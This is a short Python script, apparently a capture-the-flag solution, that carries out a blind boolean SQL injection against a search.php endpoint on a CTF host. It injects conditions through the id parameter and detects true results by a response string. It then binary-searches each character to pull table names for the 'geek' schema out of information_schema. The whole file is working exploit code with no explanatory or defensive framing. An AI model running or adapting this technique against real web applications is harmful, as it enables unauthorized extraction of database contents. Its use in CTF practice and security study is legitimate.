#!/usr/bin/env python3
"""Extract table names from geek database via blind SQLi"""
import urllib.request
import sys

BASE = "https://f4e3f42b4687b3d9401c897d.http-ctf2.dasctf.com/search.php"

def oracle(condition):
    url = f"{BASE}?id=2-({condition})"
    try:
        resp = urllib.request.urlopen(url, timeout=10).read().decode('utf-8', errors='ignore')
        return 'NO! Not this!' in resp
    except:
        return False

# Extract tables names (length=16)
subquery = "(select(group_concat(table_name))from(information_schema.tables)where(table_schema)regexp('geek'))"
result = ""
for pos in range(1, 17):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi + 1) // 2
        cond = f"ord(substr({subquery},{pos},1))>={mid}"
        if oracle(cond):
            lo = mid
        else:
            hi = mid - 1
    c = chr(lo)
    result += c
    print(f"  [{pos}/16] '{c}' => {result}")

print(f"\n[+] Table names: {result}")
